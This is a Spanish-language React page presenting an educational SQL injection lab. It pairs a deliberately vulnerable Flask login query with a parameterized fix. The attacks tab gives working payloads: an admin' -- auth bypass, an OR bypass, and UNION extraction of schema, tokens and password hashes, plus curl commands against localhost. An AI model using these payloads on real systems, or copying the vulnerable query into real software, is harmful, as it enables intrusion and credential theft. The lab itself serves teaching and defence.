import { useState } from "react";

const TABS = ["Arquitectura", "Ataques", "Remediación", "Código"];

const terminalGreen = "#4ade80";
const terminalRed = "#f87171";
const terminalBlue = "#60a5fa";
const terminalYellow = "#fbbf24";
const terminalPurple = "#c084fc";
const bg = "#0a0e17";
const card = "#0f1623";
const border = "#1e2d45";

function Badge({ children, color }) {
  const colors = {
    red:    { bg: "#2d0f0f", border: "#7f1d1d", text: terminalRed },
    green:  { bg: "#0f2d1a", border: "#14532d", text: terminalGreen },
    blue:   { bg: "#0f1d2d", border: "#1e3a5f", text: terminalBlue },
    yellow: { bg: "#2d2208", border: "#713f12", text: terminalYellow },
    purple: { bg: "#1e0f2d", border: "#4c1d95", text: terminalPurple },
  };
  const c = colors[color] || colors.blue;
  return (
    <span style={{
      background: c.bg, border: `1px solid ${c.border}`, color: c.text,
      padding: "2px 10px", borderRadius: 4, fontSize: 11,
      fontWeight: 700, letterSpacing: "0.08em", fontFamily: "monospace",
    }}>{children}</span>
  );
}

function CodeBlock({ code, lang = "sql", highlight = [] }) {
  const lines = code.trim().split("\n");
  return (
    <div style={{
      background: "#070b12", border: `1px solid ${border}`,
      borderRadius: 6, overflow: "hidden", fontFamily: "'Courier New', monospace",
      fontSize: 12.5, lineHeight: 1.7,
    }}>
      <div style={{
        background: "#0d1320", borderBottom: `1px solid ${border}`,
        padding: "4px 12px", display: "flex", justifyContent: "space-between",
      }}>
        <span style={{ color: "#4b5563", fontSize: 11 }}>{lang}</span>
        <div style={{ display: "flex", gap: 6 }}>
          {["#ef4444","#f59e0b","#22c55e"].map(c => (
            <div key={c} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />
          ))}
        </div>
      </div>
      <div style={{ padding: "12px 0", overflowX: "auto" }}>
        {lines.map((line, i) => {
          const isHighlighted = highlight.includes(i + 1);
          return (
            <div key={i} style={{
              display: "flex", alignItems: "stretch",
              background: isHighlighted ? "rgba(239,68,68,0.08)" : "transparent",
              borderLeft: isHighlighted ? "2px solid #ef4444" : "2px solid transparent",
            }}>
              <span style={{
                color: "#374151", userSelect: "none", padding: "0 12px",
                minWidth: 36, textAlign: "right", fontSize: 11,
              }}>{i + 1}</span>
              <span style={{
                padding: "0 12px", color: isHighlighted ? "#fca5a5" : "#d1d5db",
                flex: 1, whiteSpace: "pre",
              }}>{line}</span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function Section({ title, children, icon }) {
  return (
    <div style={{ marginBottom: 28 }}>
      <div style={{
        display: "flex", alignItems: "center", gap: 8,
        marginBottom: 14, paddingBottom: 8,
        borderBottom: `1px solid ${border}`,
      }}>
        <span style={{ fontSize: 16 }}>{icon}</span>
        <h2 style={{
          color: "#f1f5f9", fontFamily: "'Courier New', monospace",
          fontSize: 14, fontWeight: 700, letterSpacing: "0.05em", margin: 0,
        }}>{title}</h2>
      </div>
      {children}
    </div>
  );
}

function AttackStep({ number, title, payload, result, why }) {
  const [open, setOpen] = useState(false);
  return (
    <div style={{
      background: card, border: `1px solid ${border}`,
      borderRadius: 8, overflow: "hidden", marginBottom: 12,
    }}>
      <button
        onClick={() => setOpen(!open)}
        style={{
          width: "100%", background: "none", border: "none", cursor: "pointer",
          padding: "12px 16px", display: "flex", alignItems: "center", gap: 12,
          textAlign: "left",
        }}
      >
        <div style={{
          width: 24, height: 24, borderRadius: "50%",
          background: "rgba(239,68,68,0.15)", border: "1px solid #7f1d1d",
          display: "flex", alignItems: "center", justifyContent: "center",
          color: terminalRed, fontSize: 11, fontWeight: 800, flexShrink: 0,
          fontFamily: "monospace",
        }}>{number}</div>
        <span style={{
          color: "#e2e8f0", fontFamily: "'Courier New', monospace",
          fontSize: 13, fontWeight: 600, flex: 1,
        }}>{title}</span>
        <span style={{ color: "#4b5563", fontSize: 12 }}>{open ? "▲" : "▼"}</span>
      </button>
      {open && (
        <div style={{ padding: "0 16px 16px", borderTop: `1px solid ${border}` }}>
          <div style={{ marginTop: 12, marginBottom: 8 }}>
            <span style={{ color: "#6b7280", fontSize: 11, fontFamily: "monospace" }}>PAYLOAD</span>
          </div>
          <div style={{
            background: "#070b12", border: `1px solid #7f1d1d`, borderRadius: 6,
            padding: "10px 14px", fontFamily: "'Courier New', monospace",
            color: terminalRed, fontSize: 12.5, wordBreak: "break-all",
          }}>{payload}</div>

          <div style={{ marginTop: 12, marginBottom: 8 }}>
            <span style={{ color: "#6b7280", fontSize: 11, fontFamily: "monospace" }}>RESULTADO ESPERADO</span>
          </div>
          <div style={{
            background: "#070b12", border: `1px solid #14532d`, borderRadius: 6,
            padding: "10px 14px", fontFamily: "'Courier New', monospace",
            color: terminalGreen, fontSize: 12,
          }}>{result}</div>

          <div style={{ marginTop: 12, marginBottom: 8 }}>
            <span style={{ color: "#6b7280", fontSize: 11, fontFamily: "monospace" }}>¿POR QUÉ FUNCIONA?</span>
          </div>
          <div style={{
            background: "#0d1320", border: `1px solid ${border}`, borderRadius: 6,
            padding: "10px 14px", color: "#94a3b8", fontSize: 12.5, lineHeight: 1.6,
          }}>{why}</div>
        </div>
      )}
    </div>
  );
}

function ComparisonRow({ label, vuln, secure }) {
  return (
    <tr>
      <td style={{ padding: "9px 12px", color: "#94a3b8", fontFamily: "monospace", fontSize: 12.5, borderBottom: `1px solid ${border}` }}>{label}</td>
      <td style={{ padding: "9px 12px", color: terminalRed, fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}>{vuln}</td>
      <td style={{ padding: "9px 12px", color: terminalGreen, fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}>{secure}</td>
    </tr>
  );
}

// ── TABS ────────────────────────────────────────────────────────────

function TabArquitectura() {
  return (
    <div>
      <Section icon="🏗️" title="STACK TECNOLÓGICO">
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: 10 }}>
          {[
            { label: "Runtime", value: "Python 3.11", icon: "🐍" },
            { label: "Framework", value: "Flask 3.0", icon: "⚗️" },
            { label: "Base de Datos", value: "SQLite 3", icon: "🗄️" },
            { label: "Contenedores", value: "Docker Compose", icon: "🐳" },
            { label: "Red", value: "Bridge Aislada", icon: "🔒" },
          ].map(item => (
            <div key={item.label} style={{
              background: card, border: `1px solid ${border}`, borderRadius: 8,
              padding: "12px 14px",
            }}>
              <div style={{ fontSize: 20, marginBottom: 6 }}>{item.icon}</div>
              <div style={{ color: "#4b5563", fontSize: 10, fontFamily: "monospace", letterSpacing: "0.1em" }}>{item.label}</div>
              <div style={{ color: "#e2e8f0", fontSize: 13, fontFamily: "monospace", fontWeight: 700, marginTop: 2 }}>{item.value}</div>
            </div>
          ))}
        </div>
      </Section>

      <Section icon="🌐" title="DIAGRAMA DE RED">
        <div style={{
          background: "#070b12", border: `1px solid ${border}`,
          borderRadius: 8, padding: 16, fontFamily: "'Courier New', monospace",
          fontSize: 12, color: "#64748b", lineHeight: 1.8,
        }}>
          <pre style={{ margin: 0, color: "#64748b", overflowX: "auto" }}>{`┌─────────────────────────────────────────────────────┐
│        Docker Bridge Network  172.28.0.0/16          │
│                  (RED AISLADA)                        │
│                                                       │
│  ┌──────────────────────┐  ┌──────────────────────┐  │
│  │   sqli_vulnerable    │  │    sqli_secure        │  │
│  │   Flask :5000        │  │    Flask :5000        │  │
│  │   APP_MODE=vulnerable│  │    APP_MODE=secure    │  │
│  │   SQLite /app/data/  │  │    SQLite /app/data/  │  │
│  └──────────────────────┘  └──────────────────────┘  │
│          │ :5000                     │ :5001           │
└──────────┼───────────────────────────┼───────────────┘
           │  port-forward             │  port-forward
    `}<span style={{ color: terminalRed }}>localhost:5000</span>               <span style={{ color: terminalGreen }}>localhost:5001</span>{`
      ⚠️  VULNERABLE               ✅ SEGURO`}</pre>
        </div>
      </Section>

      <Section icon="🗄️" title="ESTRUCTURA DE LA BASE DE DATOS">
        <CodeBlock lang="sql" code={`-- Tabla de autenticación
CREATE TABLE users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT    NOT NULL UNIQUE,
    password TEXT    NOT NULL,  -- SHA-256 hex
    role     TEXT    NOT NULL DEFAULT 'user',
    email    TEXT
);

-- Tabla de productos (endpoint /search)
CREATE TABLE products (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    name        TEXT NOT NULL,
    description TEXT,
    price       REAL NOT NULL,
    category    TEXT
);

-- ¡Tabla secreta! El atacante intentará extraerla via UNION
CREATE TABLE secret_tokens (
    id    INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT NOT NULL,   -- FLAG{sql_injection_master_2024}
    note  TEXT
);`} />
      </Section>

      <Section icon="🚀" title="COMANDOS DE DESPLIEGUE">
        <CodeBlock lang="bash" code={`# Clonar e iniciar el laboratorio
git clone https://github.com/TU_USUARIO/sqli-lab.git
cd sqli-lab

# Construir imágenes y levantar contenedores
docker compose up --build -d

# Verificar estado
docker compose ps

# Ver logs en tiempo real
docker logs -f sqli_vulnerable

# Detener y limpiar todo (incluye BBDDs)
docker compose down -v`} />
      </Section>
    </div>
  );
}

function TabAtaques() {
  return (
    <div>
      <div style={{
        background: "#2d0f0f", border: "1px solid #7f1d1d",
        borderRadius: 8, padding: "12px 16px", marginBottom: 24,
        display: "flex", gap: 10, alignItems: "flex-start",
      }}>
        <span style={{ fontSize: 18 }}>⚠️</span>
        <div>
          <div style={{ color: terminalRed, fontFamily: "monospace", fontSize: 13, fontWeight: 700 }}>ENTORNO OBJETIVO</div>
          <div style={{ color: "#fca5a5", fontFamily: "monospace", fontSize: 12, marginTop: 4 }}>
            http://localhost:5000 — Solo ejecutar contra tu propio laboratorio local
          </div>
        </div>
      </div>

      <Section icon="💉" title="FUNDAMENTO TÉCNICO">
        <p style={{ color: "#94a3b8", fontSize: 13, lineHeight: 1.7, marginBottom: 16 }}>
          La inyección SQL ocurre cuando la aplicación construye queries concatenando
          directamente la entrada del usuario. El motor SQL recibe un único string y no puede
          distinguir entre el código del desarrollador y los datos del usuario.
        </p>
        <CodeBlock
          lang="python — app.py (VULNERABLE)"
          highlight={[3, 4]}
          code={`# ❌ CÓDIGO VULNERABLE: concatenación directa
query = (
    f"SELECT id, username, role, email FROM users "
    f"WHERE username = '{username}' AND password = '{hashed_pw}'"
)
con.execute(query)   # El motor SQL no sabe que username puede ser malicioso`}
        />
      </Section>

      <Section icon="🎯" title="ATAQUES PASO A PASO">
        <AttackStep
          number="1"
          title="Bypass de Autenticación — Login sin contraseña"
          payload={"Usuario: admin' --\nContraseña: (cualquier valor)"}
          result={"✅ Acceso concedido como admin\n→ Redirige a /dashboard con rol 'admin'"}
          why={`El payload cierra la comilla del parámetro username y comenta el resto:\n\nWHERE username = 'admin' --' AND password = '...'\n\nEl operador -- comenta todo lo que sigue, eliminando la verificación de contraseña. El motor solo evalúa: WHERE username = 'admin' → devuelve el usuario.`}
        />
        <AttackStep
          number="2"
          title="OR-based Bypass — Acceder sin conocer ningún usuario"
          payload={"Usuario: ' OR '1'='1' --\nContraseña: x"}
          result={"✅ Acceso como el primer usuario de la tabla (alice o admin)"}
          why={`La condición '1'='1' siempre es TRUE, lo que hace que el WHERE completo sea TRUE para TODOS los registros:\n\nWHERE username = '' OR '1'='1' --' AND password = '...'\n\nSQLite devuelve el primer registro de la tabla.`}
        />
        <AttackStep
          number="3"
          title="UNION Injection — Enumerar tablas del sistema"
          payload={"/search?q=' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table' --"}
          result={"Filas con: users, products, secret_tokens y su definición SQL"}
          why={`UNION permite combinar el resultado de dos SELECT. sqlite_master es la tabla del sistema que contiene la estructura de todas las tablas.\n\nEl atacante primero confirma el número de columnas (5) con: ' UNION SELECT NULL,NULL,NULL,NULL,NULL --\nLuego usa sqlite_master para obtener el schema completo.`}
        />
        <AttackStep
          number="4"
          title="UNION Injection — Extraer tokens secretos"
          payload={"/search?q=' UNION SELECT id,token,note,'','secret' FROM secret_tokens --"}
          result={"FLAG{sql_injection_master_2024}\nAPI_KEY_PROD_a3f9c2b8e1d4"}
          why={`Una vez conocida la estructura de la tabla secret_tokens (del ataque anterior), el atacante puede extraer todos sus datos.\n\nLa query combinada devuelve primero los productos (LIKE '') y luego los tokens — todos visibles en la tabla HTML de respuesta.`}
        />
        <AttackStep
          number="5"
          title="UNION Injection — Extraer hashes de contraseñas"
          payload={"/search?q=' UNION SELECT id,username,password,role,email FROM users --"}
          result={"admin | 240be518fa... | admin\nalice | 9f86d08188... | user"}
          why={`Las contraseñas almacenadas como SHA-256 pueden ser crackeadas offline con herramientas como hashcat o mediante tablas rainbow. El atacante obtiene el hash y lo crackea localmente sin necesidad de más interacción con la aplicación.`}
        />
      </Section>

      <Section icon="💻" title="ATAQUES VÍA cURL">
        <CodeBlock lang="bash" code={`# Ataque 1: Bypass de autenticación
curl -s -X POST http://localhost:5000/login \\
  -d "username=admin'+--&password=x" \\
  -L -c cookies.txt | grep -o "Bienvenido.*"

# Ataque 2: Enumerar tablas del sistema
curl -s "http://localhost:5000/search?q='+UNION+SELECT+1,name,sql,4,5+FROM+sqlite_master+WHERE+type='table'+--%20"

# Ataque 3: Extraer tokens secretos
curl -s "http://localhost:5000/search?q='+UNION+SELECT+id,token,note,'','x'+FROM+secret_tokens+--"`} />
      </Section>
    </div>
  );
}

function TabRemediacion() {
  return (
    <div>
      <Section icon="✅" title="SOLUCIÓN: CONSULTAS PARAMETRIZADAS">
        <p style={{ color: "#94a3b8", fontSize: 13, lineHeight: 1.7, marginBottom: 16 }}>
          Los Prepared Statements (consultas parametrizadas) separan de forma fundamental
          el <strong style={{ color: "#e2e8f0" }}>código SQL</strong> de los{" "}
          <strong style={{ color: "#e2e8f0" }}>datos del usuario</strong>. El motor SQL
          compila el plan de ejecución antes de recibir los datos.
        </p>
        <CodeBlock
          lang="python — app.py (SEGURO)"
          highlight={[2, 3]}
          code={`# ✅ CÓDIGO SEGURO: parámetros vinculados
query = "SELECT id, username, role, email FROM users WHERE username = ? AND password = ?"
con.execute(query, (username, hashed_pw))
#                   ^^^^^^^^^^^^^^^^^^^
#   Los valores son datos, nunca se interpretan como SQL`}
        />
      </Section>

      <Section icon="🔬" title="ANÁLISIS INTERNO: ¿POR QUÉ ES IMPOSIBLE BYPASSEAR?">
        <div style={{
          background: card, border: `1px solid ${border}`, borderRadius: 8, padding: 16, marginBottom: 16,
        }}>
          <div style={{ color: "#4b5563", fontSize: 11, fontFamily: "monospace", letterSpacing: "0.1em", marginBottom: 10 }}>
            FLUJO DE EJECUCIÓN CON PARÁMETROS VINCULADOS
          </div>
          {[
            { step: "1", color: terminalBlue, title: "Compilación", desc: "Python envía SOLO la estructura SQL al motor. Los '?' son marcadores de tipo, no strings." },
            { step: "2", color: terminalYellow, title: "Plan de consulta", desc: "El motor parsea y optimiza la query ANTES de ver los datos. La estructura está bloqueada." },
            { step: "3", color: terminalPurple, title: "Binding de datos", desc: "Los valores del usuario se envían como objetos Python separados — nunca como texto SQL." },
            { step: "4", color: terminalGreen, title: "Escape automático", desc: "El driver escapa automáticamente caracteres especiales: ' → '' (literal, no sintaxis SQL)." },
          ].map(item => (
            <div key={item.step} style={{
              display: "flex", gap: 12, marginBottom: 10, alignItems: "flex-start",
            }}>
              <div style={{
                width: 22, height: 22, borderRadius: "50%",
                background: "rgba(0,0,0,0.3)",
                border: `1px solid ${item.color}`,
                display: "flex", alignItems: "center", justifyContent: "center",
                color: item.color, fontSize: 10, fontWeight: 800, flexShrink: 0,
                fontFamily: "monospace", marginTop: 1,
              }}>{item.step}</div>
              <div>
                <div style={{ color: item.color, fontFamily: "monospace", fontSize: 12, fontWeight: 700 }}>{item.title}</div>
                <div style={{ color: "#64748b", fontSize: 12, marginTop: 2, lineHeight: 1.5 }}>{item.desc}</div>
              </div>
            </div>
          ))}
        </div>

        <CodeBlock
          lang="sql — Lo que el motor evalúa con payload malicioso"
          code={`-- Input del atacante: username = "admin' --"
-- Con parámetros, el motor evalúa:

WHERE username = 'admin'' --'
--                      ^^
--         Comilla simple ESCAPADA (duplicada)
--         → Busca el string literal "admin' --"
--         → No existe ningún usuario con ese nombre
--         → 0 filas → acceso denegado ✅`}
        />
      </Section>

      <Section icon="🛡️" title="DEFENSA EN PROFUNDIDAD">
        {[
          {
            title: "1. Principio de Mínimo Privilegio",
            desc: "El usuario de BD solo tiene permisos SELECT en las tablas necesarias. Aunque se inyecte SQL, no puede hacer DROP/INSERT/UPDATE.",
            badge: "ARQUITECTURA", color: "blue",
          },
          {
            title: "2. Validación con Whitelist",
            desc: "Rechazar en capa de aplicación cualquier input que no cumpla el formato esperado (regex, tipos, longitud máxima).",
            badge: "INPUT VALIDATION", color: "yellow",
          },
          {
            title: "3. ORM (SQLAlchemy)",
            desc: "Un ORM genera prepared statements automáticamente por diseño — elimina la posibilidad de concatenación accidental.",
            badge: "ABSTRACCIÓN", color: "purple",
          },
          {
            title: "4. WAF como capa adicional",
            desc: "Un Web Application Firewall detecta patrones SQLi conocidos. Complementa, pero no reemplaza, los prepared statements.",
            badge: "CAPA EXTRA", color: "green",
          },
        ].map(item => (
          <div key={item.title} style={{
            background: card, border: `1px solid ${border}`, borderRadius: 8,
            padding: "12px 16px", marginBottom: 10,
          }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
              <div style={{ color: "#e2e8f0", fontFamily: "monospace", fontSize: 13, fontWeight: 700 }}>{item.title}</div>
              <Badge color={item.color}>{item.badge}</Badge>
            </div>
            <div style={{ color: "#64748b", fontSize: 12.5, lineHeight: 1.6 }}>{item.desc}</div>
          </div>
        ))}
      </Section>

      <Section icon="📊" title="TABLA COMPARATIVA">
        <div style={{ overflowX: "auto" }}>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                <th style={{ padding: "8px 12px", background: "#0d1320", color: "#4b5563", textAlign: "left", fontSize: 11, fontFamily: "monospace", letterSpacing: "0.1em" }}>ASPECTO</th>
                <th style={{ padding: "8px 12px", background: "#0d1320", color: terminalRed, textAlign: "left", fontSize: 11, fontFamily: "monospace", letterSpacing: "0.1em" }}>⚠️ VULNERABLE</th>
                <th style={{ padding: "8px 12px", background: "#0d1320", color: terminalGreen, textAlign: "left", fontSize: 11, fontFamily: "monospace", letterSpacing: "0.1em" }}>✅ SEGURO</th>
              </tr>
            </thead>
            <tbody>
              <ComparisonRow label="Construcción de query" vuln="f-string / concatenación" secure="Marcadores ? + tupla" />
              <ComparisonRow label="Parsing SQL" vuln="Con datos incluidos" secure="Antes de recibir datos" />
              <ComparisonRow label="Caracteres especiales" vuln="Interpretados como SQL" secure="Escapados automáticamente" />
              <ComparisonRow label="Auth bypass" vuln="Posible con admin' --" secure="Imposible" />
              <ComparisonRow label="UNION injection" vuln="Posible" secure="Imposible" />
              <ComparisonRow label="Stacked queries" vuln="Posible (MySQL)" secure="Imposible" />
              <ComparisonRow label="Performance" vuln="Sin caché de plan" secure="Plan reutilizable (más rápido)" />
            </tbody>
          </table>
        </div>
      </Section>
    </div>
  );
}

function TabCodigo() {
  const [activeFile, setActiveFile] = useState("app.py");

  const files = {
    "app.py": {
      lang: "python",
      code: `"""
SQLi LAB  –  Flask (Dual Mode)
APP_MODE=vulnerable  →  código intencionalmente inseguro
APP_MODE=secure      →  código remediado con Prepared Statements
"""

import os, sqlite3, hashlib, logging
from flask import Flask, request, render_template_string, redirect, url_for, session

APP_MODE = os.environ.get("APP_MODE", "vulnerable")
DB_PATH  = "/app/data/lab.db"
app      = Flask(__name__)
app.secret_key = "lab-secret-key-do-not-use-in-prod"

def _hash(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

# ── ⚠️  CÓDIGO VULNERABLE ─────────────────────────────────
def _login_vulnerable(username: str, hashed_pw: str):
    query = (
        f"SELECT id, username, role, email FROM users "
        f"WHERE username = '{username}' AND password = '{hashed_pw}'"
    )
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    try:
        row = con.execute(query).fetchone()
    except sqlite3.OperationalError:
        row = None
    finally:
        con.close()
    return dict(row) if row else None, query

# ── ✅ CÓDIGO SEGURO ──────────────────────────────────────
def _login_secure(username: str, hashed_pw: str):
    query = "SELECT id, username, role, email FROM users WHERE username = ? AND password = ?"
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    try:
        row = con.execute(query, (username, hashed_pw)).fetchone()
    except sqlite3.OperationalError:
        row = None
    finally:
        con.close()
    return dict(row) if row else None, query

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        fn = _login_vulnerable if APP_MODE == "vulnerable" else _login_secure
        result, _ = fn(username, _hash(password))
        if result:
            session["user"] = result["username"]
            return redirect("/dashboard")
    return render_template_string("... plantilla HTML ...")`,
    },
    "docker-compose.yml": {
      lang: "yaml",
      code: `version: "3.8"

services:
  vuln-app:
    build:
      context: ./app
      dockerfile: Dockerfile
    container_name: sqli_vulnerable
    environment:
      - APP_MODE=vulnerable
    ports:
      - "5000:5000"          # Puerto público → app vulnerable
    volumes:
      - db-data:/app/data
    networks:
      - sqli-lab-net

  secure-app:
    build:
      context: ./app
      dockerfile: Dockerfile
    container_name: sqli_secure
    environment:
      - APP_MODE=secure
    ports:
      - "5001:5000"          # Puerto público → app segura
    volumes:
      - db-data-secure:/app/data
    networks:
      - sqli-lab-net

networks:
  sqli-lab-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16  # Red completamente aislada

volumes:
  db-data:
  db-data-secure:`,
    },
    "Dockerfile": {
      lang: "dockerfile",
      code: `FROM python:3.11-slim

LABEL maintainer="SQLi-Lab Portfolio"
LABEL description="Laboratorio educativo de SQL Injection"

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \\
    sqlite3 \\
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN mkdir -p /app/data

EXPOSE 5000

# APP_MODE se inyecta via ENV en docker-compose
CMD ["python", "app.py"]`,
    },
  };

  return (
    <div>
      <Section icon="📁" title="ESTRUCTURA DEL REPOSITORIO">
        <CodeBlock lang="tree" code={`sqli-lab/
├── app/
│   ├── app.py              # 🐍 Flask dual-mode (vulnerable + secure)
│   ├── Dockerfile          # 🐳 Imagen del contenedor
│   └── requirements.txt    # 📦 Flask, Werkzeug
├── docs/
│   ├── 01-setup.md         # 🚀 Instalación y arquitectura
│   ├── 02-exploitation.md  # ⚔️  Guía ofensiva detallada
│   └── 03-remediation.md   # 🛡️  Código seguro y análisis
├── docker-compose.yml      # 🐳 Orquestación (puerto 5000 + 5001)
├── .gitignore
└── README.md               # 📄 Portada del portfolio`} />
      </Section>

      <Section icon="💻" title="ARCHIVOS DEL PROYECTO">
        <div style={{ display: "flex", gap: 8, marginBottom: 12, flexWrap: "wrap" }}>
          {Object.keys(files).map(name => (
            <button
              key={name}
              onClick={() => setActiveFile(name)}
              style={{
                background: activeFile === name ? "#1e3a5f" : card,
                border: `1px solid ${activeFile === name ? terminalBlue : border}`,
                color: activeFile === name ? terminalBlue : "#94a3b8",
                padding: "5px 14px", borderRadius: 6,
                fontFamily: "monospace", fontSize: 12, cursor: "pointer",
              }}
            >{name}</button>
          ))}
        </div>
        <CodeBlock lang={files[activeFile].lang} code={files[activeFile].code} />
      </Section>

      <Section icon="🔑" title="CREDENCIALES DE PRUEBA">
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              {["Usuario", "Contraseña", "Rol", "Email"].map(h => (
                <th key={h} style={{ padding: "8px 12px", background: "#0d1320", color: "#4b5563", textAlign: "left", fontSize: 11, fontFamily: "monospace" }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {[
              ["admin", "admin123",   "admin", "admin@lab.local"],
              ["alice", "alice2024",  "user",  "alice@lab.local"],
              ["bob",   "b0bSecure!", "user",  "bob@lab.local"],
            ].map(([u, p, r, e]) => (
              <tr key={u}>
                <td style={{ padding: "8px 12px", color: terminalYellow, fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}>{u}</td>
                <td style={{ padding: "8px 12px", color: terminalGreen, fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}>{p}</td>
                <td style={{ padding: "8px 12px", fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}><Badge color={r === "admin" ? "red" : "blue"}>{r}</Badge></td>
                <td style={{ padding: "8px 12px", color: "#4b5563", fontFamily: "monospace", fontSize: 12, borderBottom: `1px solid ${border}` }}>{e}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </Section>
    </div>
  );
}

// ── MAIN APP ────────────────────────────────────────────────────────
export default function App() {
  const [active, setActive] = useState(0);

  const tabComponents = [TabArquitectura, TabAtaques, TabRemediacion, TabCodigo];
  const ActiveTab = tabComponents[active];

  const tabIcons = ["🏗️", "💉", "🛡️", "💻"];

  return (
    <div style={{ background: bg, minHeight: "100vh", padding: "24px 16px", fontFamily: "'Courier New', monospace" }}>
      <div style={{ maxWidth: 860, margin: "0 auto" }}>

        {/* Header */}
        <div style={{ marginBottom: 28, borderBottom: `1px solid ${border}`, paddingBottom: 20 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: 10 }}>
            <div>
              <div style={{
                color: terminalGreen, fontSize: 11, letterSpacing: "0.2em",
                fontWeight: 700, marginBottom: 6,
              }}>PORTFOLIO · DEVSECOPS · LABORATORIO EDUCATIVO</div>
              <h1 style={{
                color: "#f1f5f9", fontSize: 22, fontWeight: 800, margin: 0,
                letterSpacing: "0.02em",
              }}>🔐 SQL Injection Lab</h1>
              <div style={{ color: "#4b5563", fontSize: 12, marginTop: 6 }}>
                Seguridad Ofensiva + Defensiva · Flask · Docker · SQLite
              </div>
            </div>
            <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
              <Badge color="red">⚠️ VULNERABLE :5000</Badge>
              <Badge color="green">✅ SEGURO :5001</Badge>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div style={{
          display: "flex", gap: 4, marginBottom: 24,
          borderBottom: `1px solid ${border}`, paddingBottom: 0,
          overflowX: "auto",
        }}>
          {TABS.map((tab, i) => (
            <button
              key={tab}
              onClick={() => setActive(i)}
              style={{
                background: "none", border: "none", cursor: "pointer",
                padding: "8px 16px",
                color: active === i ? "#f1f5f9" : "#4b5563",
                fontFamily: "'Courier New', monospace", fontSize: 13, fontWeight: active === i ? 700 : 400,
                borderBottom: active === i ? `2px solid ${terminalGreen}` : "2px solid transparent",
                marginBottom: -1, whiteSpace: "nowrap",
                transition: "color 0.15s",
              }}
            >
              {tabIcons[i]} {tab}
            </button>
          ))}
        </div>

        {/* Tab Content */}
        <ActiveTab />

        {/* Footer */}
        <div style={{
          borderTop: `1px solid ${border}`, marginTop: 32, paddingTop: 16,
          display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: 8,
        }}>
          <span style={{ color: "#1e2d45", fontSize: 11, fontFamily: "monospace" }}>
            MIT License · Solo uso educativo y local
          </span>
          <span style={{ color: "#1e2d45", fontSize: 11, fontFamily: "monospace" }}>
            Python 3.11 · Flask 3.0 · Docker Compose · SQLite 3
          </span>
        </div>
      </div>
    </div>
  );
}
